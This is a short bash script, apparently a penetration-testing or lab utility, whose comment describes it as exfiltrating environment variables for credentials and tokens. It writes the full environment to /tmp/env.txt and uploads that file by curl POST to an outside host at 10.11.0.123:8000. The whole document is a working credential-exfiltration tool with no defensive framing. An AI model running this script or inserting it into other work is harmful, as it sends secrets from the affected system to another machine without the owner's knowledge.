#!/bin/bash
# Exfil environment variables, useful for credentials/tokens

env > /tmp/env.txt
curl -X POST -F "file=@/tmp/env.txt" http://10.11.0.123:8000/upload
